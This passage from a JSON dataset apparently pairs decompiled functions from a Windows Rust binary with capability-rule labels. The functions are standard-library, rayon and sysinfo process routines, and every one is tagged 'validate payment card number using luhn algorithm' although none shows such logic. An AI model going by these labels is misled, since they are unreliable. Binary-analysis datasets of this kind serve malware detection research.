        "decompiled_code": "\nvoid sym.core::fmt::Write::write_fmt::h114b7a378e5660d9(ulong arg1, uint *arg2)\n\n{\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // core::fmt::Write::write_fmt::h114b7a378e5660d9\n    uStack56 = *arg2;\n    uStack52 = arg2[1];\n    uStack48 = arg2[2];\n    uStack44 = arg2[3];\n    uStack40 = arg2[4];\n    uStack36 = arg2[5];\n    uStack32 = arg2[6];\n    uStack28 = arg2[7];\n    uStack24 = arg2[8];\n    uStack20 = arg2[9];\n    uStack16 = arg2[10];\n    uStack12 = arg2[0xb];\n    uStack64 = arg1;\n    dbg.write(&uStack64, 0x449400, &uStack56);\n    return;\n}\n",
        "token_count": 287
    },
    "bbf000a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * sym.std::io::stdio::set_output_capture::hbbf000a2b5bc7f34(int64_t *arg1)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    uchar auStack24 [8];\n    int64_t *piStack16;\n    \n    // std::io::stdio::set_output_capture::hbbf000a2b5bc7f34\n    if ((arg1 == NULL) && (*0x452058 == '\\0')) {\n        piVar2 = NULL;\n    }\n    else {\n        *0x452058 = '\\x01';\n        piStack16 = arg1;\n        ppiVar1 = sym.std::io::stdio::OUTPUT_CAPTURE::__getit::h72cfa132fd89b34c();\n        if (ppiVar1 == NULL) {\n            if (arg1 != NULL) {\n                LOCK();\n                *arg1 = *arg1 + -1;\n                if (*arg1 == 0) {\n                    dbg.drop_slow<std::sync::mutex::Mutex<alloc::vec::Vec<u8, alloc::alloc::Global>>>(piStack16);\n                }\n            }\n            dbg.unwrap_failed(\"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                              , 0x46, auStack24, 0x449868);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        piVar2 = *ppiVar1;\n        *ppiVar1 = arg1;\n    }\n    return piVar2;\n}\n",
        "token_count": 374
    },
    "fd9982f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::Write::write_fmt::hfd9982f96d3b1cad(ulong arg1, uint *arg2)\n\n{\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // core::fmt::Write::write_fmt::hfd9982f96d3b1cad\n    uStack56 = *arg2;\n    uStack52 = arg2[1];\n    uStack48 = arg2[2];\n    uStack44 = arg2[3];\n    uStack40 = arg2[4];\n    uStack36 = arg2[5];\n    uStack32 = arg2[6];\n    uStack28 = arg2[7];\n    uStack24 = arg2[8];\n    uStack20 = arg2[9];\n    uStack16 = arg2[10];\n    uStack12 = arg2[0xb];\n    uStack64 = arg1;\n    dbg.write(&uStack64, 0x449490, &uStack56);\n    return;\n}\n",
        "token_count": 287
    },
    "2209a643": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sys_common::backtrace::_print_fmt::__u7b__u7b_closure_u7d__u7d_::h2209a643ee029f56\n               (int64_t *arg1, ulong arg2, uint *arg3)\n\n{\n    int64_t *arg4;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    ulong uStack8;\n    \n    // std::sys_common::backtrace::_print_fmt::_$u7b$$u7b$closure$u7d$$u7d$::h2209a643ee029f56\n    uStack8 = *(arg3 + 4);\n    uStack24 = *arg3;\n    uStack20 = arg3[1];\n    uStack16 = arg3[2];\n    uStack12 = arg3[3];\n    arg4 = *arg1;\n    if (*arg1 != NULL) {\n        arg4 = arg1;\n    }\n    dbg.output_filename(arg2, &uStack24, arg3 & 0xffffffffffffff00 | *(arg1 + 3), arg4);\n    return;\n}\n",
        "token_count": 254
    },
    "e5d1a1f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong sym.std::io::Write::write_vectored::he5d1a1f353a690dc(ulong arg1, ulong arg2, int64_t arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    char *arg3_00;\n    uint64_t arg4_00;\n    \n    // std::io::Write::write_vectored::he5d1a1f353a690dc\n    iVar1 = 0;\n    arg3_00 = \n    \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n    ;\n    do {\n        if (arg4 << 4 == iVar1) {\n            arg4_00 = 0;\n            goto code_r0x00439fec;\n        }\n        arg4_00 = *(arg3 + iVar1);\n        iVar1 = iVar1 + 0x10;\n    } while (arg4_00 == 0);\n    arg3_00 = *(arg3 + -8 + iVar1);\ncode_r0x00439fec:\n    sym.std::sys::windows::stdio::write::h347b2bf3c3c6597f(arg1, 0xfffffff4, arg3_00, arg4_00);\n    return arg1;\n}\n",
        "token_count": 313
    },
    "a056fc26": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::ha056fc26143cdb23(ulong arg1, int64_t arg2)\n\n{\n    ulong arg1_00;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::ha056fc26143cdb23\n    arg1_00 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::hb8b4e66ae7491bb0(arg1, arg2, 1);\n    if (arg2 == -0x7fffffffffffffff) {\n        return;\n    }\n    if (arg2 == 0) {\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    dbg.handle_alloc_error(arg1_00);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 202
    },
    "c2f35880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_alloc::vec::Vec_sysinfo::windows::process::Process__::hc2f3588007d941dd(ulong *arg1)\n\n{\n    uchar auVar1 [16];\n    \n    // core::ptr::drop_in_place<alloc::vec::Vec<sysinfo::windows::process::Process>>::hc2f3588007d941dd\n    sym.core::ptr::drop_in_place__sysinfo::windows::process::Process__::h82561d4614afe4c7(*arg1);\n    if ((arg1[1] != 0) && (auVar1 = ZEXT816(arg1[1]) * ZEXT816(0x110),  SUB168(auVar1 >> 0x40, 0) == 0)) {\n        if (SUB168(auVar1, 0) == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "82561d46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place__sysinfo::windows::process::Process__::h82561d4614afe4c7(int64_t arg1)\n\n{\n    int64_t in_RDX;\n    int64_t iVar1;\n    \n    // core::ptr::drop_in_place<[sysinfo::windows::process::Process]>::h82561d4614afe4c7\n    for (iVar1 = in_RDX * 0x110; iVar1 != 0; iVar1 = iVar1 + -0x110) {\n        sym.core::ptr::drop_in_place_sysinfo::windows::process::Process_::he2d436bb30ee18b4(arg1);\n        arg1 = arg1 + 0x110;\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "e2d436bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_sysinfo::windows::process::Process_::he2d436bb30ee18b4(int64_t arg1)\n\n{\n    // core::ptr::drop_in_place<sysinfo::windows::process::Process>::he2d436bb30ee18b4\n    if (*(arg1 + 0xb8) != 0) {\n        sub.KERNEL32.dll_CloseHandle();\n    }\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(arg1);\n    sym.core::ptr::drop_in_place_alloc::vec::Vec_alloc::string::String__::h06728ccdb48f52e8(arg1 + 0x18);\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(arg1 + 0x30);\n    sym.core::ptr::drop_in_place_alloc::vec::Vec_alloc::string::String__::h06728ccdb48f52e8(arg1 + 0x50);\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(arg1 + 0x68);\n    if (*(arg1 + 0x88) == 0) {\n        return;\n    }\n    if (*(arg1 + 0x88) == 0) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *(arg1 + 0x80));\n    return;\n}\n",
        "token_count": 426
    },
    "06728ccd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_alloc::vec::Vec_alloc::string::String__::h06728ccdb48f52e8(int64_t *arg1)\n\n{\n    uchar auVar1 [16];\n    int64_t arg1_00;\n    int64_t iVar2;\n    \n    // core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>::h06728ccdb48f52e8\n    arg1_00 = *arg1;\n    for (iVar2 = arg1[2] * 0x18; iVar2 != 0; iVar2 = iVar2 + -0x18) {\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(arg1_00);\n        arg1_00 = arg1_00 + 0x18;\n    }\n    if ((arg1[1] != 0) && (auVar1 = ZEXT816(arg1[1]) * ZEXT816(0x18),  SUB168(auVar1 >> 0x40, 0) == 0)) {\n        if (SUB168(auVar1, 0) == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "9f68a472": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(ulong *arg1)\n\n{\n    uint64_t uVar1;\n    \n    // <alloc::raw_vec::RawVec<T,A> as core::ops::drop::Drop>::drop::h9f68a4721a6a073d\n    uVar1 = arg1[1];\n    if ((uVar1 != 0) && (!CARRY8(uVar1, uVar1))) {\n        if ((uVar1 & 0x7fffffffffffffff) == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "affce8dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym._rayon_core::job::StackJob_L_F_R__as_rayon_core::job::Job_::execute::haffce8dd07d2b5a6(int64_t *arg1)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t *unaff_RBX;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    // <rayon_core::job::StackJob<L,F,R> as rayon_core::job::Job>::execute::haffce8dd07d2b5a6\n    uStack184 = *(arg1 + 4);\n    uStack180 = *(arg1 + 0x24);\n    uStack176 = *(arg1 + 5);\n    uStack172 = *(arg1 + 0x2c);\n    uStack168 = *(arg1 + 6);\n    uStack164 = *(arg1 + 0x34);\n    uStack160 = *(arg1 + 7);\n    uStack156 = *(arg1 + 0x3c);\n    uStack152 = *(arg1 + 8);\n    uStack148 = *(arg1 + 0x44);\n    uStack144 = *(arg1 + 9);\n    uStack140 = *(arg1 + 0x4c);\n    arg1[4] = 0;\n    sym.core::option::Option_T_::unwrap::h9626077523606ac7(&uStack88, &uStack184, 0x44bea8);\n    uStack104 = uStack56;\n    uStack100 = uStack52;\n    uStack96 = uStack48;\n    uStack92 = uStack44;\n    uStack120 = uStack72;\n    uStack116 = uStack68;\n    uStack112 = uStack64;\n    uStack108 = uStack64._4_4_;\n    uStack136 = uStack88;\n    uStack132 = uStack84;\n    uStack128 = uStack80;\n    uStack124 = uStack76;\n    uStack152 = uStack56;\n    uStack148 = uStack52;\n    uStack144 = uStack48;\n    uStack140 = uStack44;\n    uStack168 = uStack72;\n    uStack164 = uStack68;\n    uStack160 = uStack64;\n    uStack156 = uStack64._4_4_;\n    uStack184 = uStack88;\n    uStack180 = uStack84;\n    uStack176 = uStack80;\n    uStack172 = uStack76;\n    sym.rayon_core::join::join_context::call_b::__u7b__u7b_closure_u7d__u7d_::h4287d59a64d6a8d7(&uStack136, &uStack184);\n    iVar2 = CONCAT44(uStack116, uStack120);\n    uVar4 = uStack136;\n    uVar5 = uStack132;\n    uVar6 = uStack128;\n    uVar7 = uStack124;\n    sym._ZN4core3ptr163drop_in_place_LT_rayon_core..job..JobResult_LT_alloc..collections..linked_list..LinkedList_LT_alloc..vec..Vec_L\n              (arg1 + 10);\n    arg1[10] = 1;\n    *(arg1 + 0xb) = CONCAT412(uVar7, CONCAT48(uVar6, CONCAT44(uVar5, uVar4)));\n    arg1[0xd] = iVar2;\n    cVar1 = *(arg1 + 3);\n    if (cVar1 == '\\0') {\n        piVar3 = *arg1[1];\n    }\n    else {\n        piVar3 = *arg1[1];\n        LOCK();\n        iVar2 = *piVar3;\n        *piVar3 = *piVar3 + 1;\n        unaff_RBX = piVar3;\n        if (*piVar3 == 0 || SCARRY8(iVar2, 1) != *piVar3 < 0) {\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    iVar2 = *arg1;\n    *arg1 = 3;\n    if (iVar2 == 2) {\n        uStack64 = 0x43b2e3;\n        sym.rayon_core::sleep::Sleep::wake_specific_thread::h550424ba75ba2220(piVar3 + 0x35, arg1[2]);\n    }\n    if (cVar1 != '\\0') {\n        LOCK();\n        *unaff_RBX = *unaff_RBX + -1;\n        if (*unaff_RBX == 0) {\n            uStack64 = 0x43b2fd;\n            sym.alloc::sync::Arc_T_::drop_slow::ha24e02ecb32d4472(&stack0xffffffffffffffe8);\n        }\n    }\n    return;\n}\n",
        "token_count": 1306
    },
    "8a4da361": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_alloc::boxed::Box_dyn_core::any::Anycore::marker::Send__::h8a4da361118e5d8e\n               (int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    // core::ptr::drop_in_place<alloc::boxed::Box<dyn core::any::Any+core::marker::Send>>::h8a4da361118e5d8e\n    (**arg1[1])(*arg1);\n    iVar1 = *arg1;\n    if (*(arg1[1] + 8) != 0) {\n        if (0x10 < *(arg1[1] + 0x10)) {\n            iVar1 = *(iVar1 + -8);\n        }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, iVar1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "b16d6590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._alloc::collections::linked_list::LinkedList_T__as_core::ops::drop::Drop_::drop::hb16d65907ff622dd(ulong arg1)\n\n{\n    int64_t iStack24;\n    \n    // <alloc::collections::linked_list::LinkedList<T> as core::ops::drop::Drop>::drop::hb16d65907ff622dd\n    while( true ) {\n        iStack24 = sym.alloc::collections::linked_list::LinkedList_T_::pop_front_node::h58c0a23a189377d5(arg1);\n        if (iStack24 == 0) break;\n        sym._ZN4core3ptr148drop_in_place_LT_alloc..boxed..Box_LT_alloc..collections..linked_list..Node_LT_alloc..vec..Vec_LT_sysinfo..wind\n                  (&iStack24);\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "4287d59a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.rayon_core::join::join_context::call_b::__u7b__u7b_closure_u7d__u7d_::h4287d59a64d6a8d7(ulong arg1, ulong arg2)\n\n{\n    // rayon_core::join::join_context::call_b::_$u7b$$u7b$closure$u7d$$u7d$::h4287d59a64d6a8d7\n    sym.rayon::iter::plumbing::bridge_producer_consumer::helper::hd38c8e70ff773f4b(arg1);\n    return;\n}\n",
        "token_count": 140
    },
    "06d1815b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::process::update_disk_usage::h06d1815b4f6f0dd5(int64_t hProcess)\n\n{\n    int32_t iVar1;\n    uchar auStack56 [24];\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    // sysinfo::windows::process::update_disk_usage::h06d1815b4f6f0dd5\n    iVar1 = sub.KERNEL32.dll_GetProcessIoCounters(*(hProcess + 0xb8), auStack56);\n    if (iVar1 != 0) {\n        *(hProcess + 0xe8) = *(hProcess + 0xf8);\n        *(hProcess + 0xec) = *(hProcess + 0xfc);\n        *(hProcess + 0xf0) = *(hProcess + 0x100);\n        *(hProcess + 0xf4) = *(hProcess + 0x104);\n        *(hProcess + 0xf8) = uStack32;\n        *(hProcess + 0xfc) = uStack28;\n        *(hProcess + 0x100) = uStack24;\n        *(hProcess + 0x104) = uStack20;\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "67a97f11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.sysinfo::windows::process::get_cmdline_from_buffer::h67a97f119be38dff(ulong *arg1, ulong lpCmdLine)\n\n{\n    ulong arg2;\n    int64_t iVar1;\n    ulong arg3;\n    int64_t iVar2;\n    int32_t iStack108;\n    ulong uStack104;\n    uchar auStack96 [8];\n    ulong uStack88;\n    uchar auStack80 [24];\n    \n    // sysinfo::windows::process::get_cmdline_from_buffer::h67a97f119be38dff\n    iVar1 = sub.SHELL32.dll_CommandLineToArgvW(lpCmdLine, &iStack108);\n    if (iVar1 == 0) {\n        *arg1 = 8;\n        *(arg1 + 1) = ZEXT816(0);\n    }\n    else {\n        uStack104 = 8;\n        _auStack96 = ZEXT816(0);\n        for (iVar2 = 0; iStack108 * 8 != iVar2; iVar2 = iVar2 + 8) {\n            arg2 = *(iVar1 + iVar2);\n            arg3 = sub.msvcrt.dll_wcslen(arg2);\n            sym.alloc::string::String::from_utf16_lossy::hcf07ab31823adcce(auStack80, arg2, arg3);\n            sym.alloc::vec::Vec_T_A_::push::hf521943342c1dfe4(&uStack104, auStack80);\n        }\n        sub.KERNEL32.dll_LocalFree(iVar1);\n        *arg1 = uStack104;\n        *(arg1 + 4) = uStack104._4_4_;\n        *(arg1 + 1) = auStack96._0_4_;\n        *(arg1 + 0xc) = auStack96._4_4_;\n        arg1[2] = uStack88;\n    }\n    return;\n}\n",
        "token_count": 426
    },
    "6e25e8dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::option::Option_T_::unwrap::h6e25e8dc4f2927c4(int16_t param_1)\n\n{\n    // core::option::Option<T>::unwrap::h6e25e8dc4f2927c4\n    if (param_1 != 0) {\n        return;\n    }\n    dbg.panic(0x44bcbb, 0x2b, 0x44c200);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 114
    },
    "1aa09a3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h1aa09a3c290b6ce8(int64_t *arg1, uint64_t arg2)\n\n{\n    // <alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index::h1aa09a3c290b6ce8\n    if (arg2 <= arg1[2]) {\n        return arg2 * 2 + *arg1;\n    }\n    dbg.slice_start_index_len_fail(arg2, arg1[2]);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 145
    },
    "cea65d7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym.alloc::raw_vec::RawVec_T_A_::allocate_in::hcea65d7f5250fa5a(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    // alloc::raw_vec::RawVec<T,A>::allocate_in::hcea65d7f5250fa5a\n    if (arg1 == 0) {\n        iVar1 = 2;\n    }\n    else {\n        if (CARRY8(arg1, arg1)) {\n            sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        iVar1 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.350\n                          (arg1 * 2, 2);\n        if (iVar1 == 0) {\n            dbg.handle_alloc_error(arg1 * 2);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 241
    },
    "5c201974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::process::get_region_size::h5c201974d4b810ee\n               (uint64_t *arg1, ulong hProcess, int64_t lpAddress)\n\n{\n    int64_t iVar1;\n    int64_t aiStack64 [3];\n    int64_t iStack40;\n    \n    // sysinfo::windows::process::get_region_size::h5c201974d4b810ee\n    iVar1 = sub.KERNEL32.dll_VirtualQueryEx(hProcess, lpAddress, aiStack64, 0x30);\n    if (iVar1 == 0) {\n        arg1[1] = 0x44c194;\n        arg1[2] = 0x29;\n    }\n    else {\n        arg1[1] = (aiStack64[0] - lpAddress) + iStack40;\n    }\n    *arg1 = iVar1 == 0;\n    return;\n}\n",
        "token_count": 204
    },
    "bc7cd8dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hbc7cd8dccb0eacb6(ulong arg1, int64_t arg2)\n\n{\n    ulong arg1_00;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::hbc7cd8dccb0eacb6\n    arg1_00 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h80ea03ef37d555fd(arg1, arg2, 1);\n    if (arg2 == -0x7fffffffffffffff) {\n        return;\n    }\n    if (arg2 == 0) {\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    dbg.handle_alloc_error(arg1_00);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 208
    },
    "fcc9d71e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar sym.core::ops::function::FnOnce::call_once_u7b__u7b_vtableshim_u7d__u7d_::hfcc9d71ea0b93b4e(ulong arg1)\n\n{\n    // core::ops::function::FnOnce::call_once$u7b$$u7b$vtableshim$u7d$$u7d$::hfcc9d71ea0b93b4e\n    sym.once_cell::imp::OnceCell_T_::initialize::__u7b__u7b_closure_u7d__u7d_::h50e146947830f4af(arg1);\n    return 1;\n}\n",
        "token_count": 149
    },
    "50e14694": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong sym.once_cell::imp::OnceCell_T_::initialize::__u7b__u7b_closure_u7d__u7d_::h50e146947830f4af(int64_t **arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uchar uVar3;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    char *pcStack24;\n    ulong uStack16;\n    \n    // once_cell::imp::OnceCell<T>::initialize::_$u7b$$u7b$closure$u7d$$u7d$::h50e146947830f4af\n    iVar1 = **arg1;\n    **arg1 = 0;\n    pcVar2 = *(iVar1 + 0x10);\n    *(iVar1 + 0x10) = 0;\n    if (pcVar2 != NULL) {\n        uVar3 = (*pcVar2)();\n        **arg1[1] = uVar3;\n        return 1;\n    }\n    uStack56 = 0x44bfb8;\n    uStack48 = 1;\n    uStack40 = 0;\n    pcStack24 = \n    \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n    ;\n    uStack16 = 0;\n    dbg.panic_fmt(&uStack56, 0x44c028);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 359
    },
    "7a438101": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::slice::__impl__T__::to_vec_in::h7a438101d708d965(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    // alloc::slice::_<impl [T]>::to_vec_in::h7a438101d708d965\n    sym.alloc::vec::Vec_T_A_::with_capacity_in::h285990c849b0cab0(arg1, arg3);\n    sym.memcpy(*arg1, arg2, arg3);\n    arg1[2] = arg3;\n    return;\n}\n",
        "token_count": 124
    },
    "285990c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::vec::Vec_T_A_::with_capacity_in::h285990c849b0cab0(ulong *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    // alloc::vec::Vec<T,A>::with_capacity_in::h285990c849b0cab0\n    uVar1 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(arg2);\n    *arg1 = uVar1;\n    arg1[1] = arg2;\n    arg1[2] = 0;\n    return;\n}\n",
        "token_count": 132
    },
    "2b336202": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::hash::BuildHasher::hash_one::h2b336202073f8864(uint64_t arg1, uint64_t arg2, ulong arg3)\n\n{\n    uint64_t uStack80;\n    uint64_t uStack72;\n    ulong uStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    uchar auStack24 [16];\n    \n    // core::hash::BuildHasher::hash_one::h2b336202073f8864\n    uStack56 = arg1 ^ 0x736f6d6570736575;\n    uStack40 = arg2 ^ 0x646f72616e646f6d;\n    uStack48 = arg1 ^ 0x6c7967656e657261;\n    uStack32 = arg2 ^ 0x7465646279746573;\n    auStack24 = ZEXT816(0);\n    uStack64 = 0;\n    uStack80 = arg1;\n    uStack72 = arg2;\n    sym.core::hash::Hasher::write_usize::ha3cf968243e64be5(&uStack80, arg3);\n    sym._std::collections::hash::map::DefaultHasher_as_core::hash::Hasher_::finish::h91b90874a8673c3f(&uStack80);\n    return;\n}\n",
        "token_count": 315
    },
    "822e361a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
